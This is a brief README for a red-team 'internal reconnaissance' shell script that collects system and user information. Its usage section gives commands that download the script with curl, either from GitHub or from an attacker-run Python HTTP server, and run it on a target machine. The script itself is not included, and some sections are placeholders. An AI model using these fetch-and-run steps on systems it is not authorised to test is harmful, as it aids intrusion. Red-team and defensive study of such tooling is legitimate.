# Internal Reconnaissance Phase

Definition...  

## Usage

```sh
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/internal-recon/internal-recon.sh
sh internal-recon.sh
```
```sh
# Local network
# Host:
python -m SimpleHTTPServer 8000 #or
python3 -m http.server 8000
# Target:
curl -LJO <Host>:8000/internal-recon.sh
sh internal-recon.sh
```

## Checks

- System Information
- User Information: 
...


## Results

Results saved to current directory.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 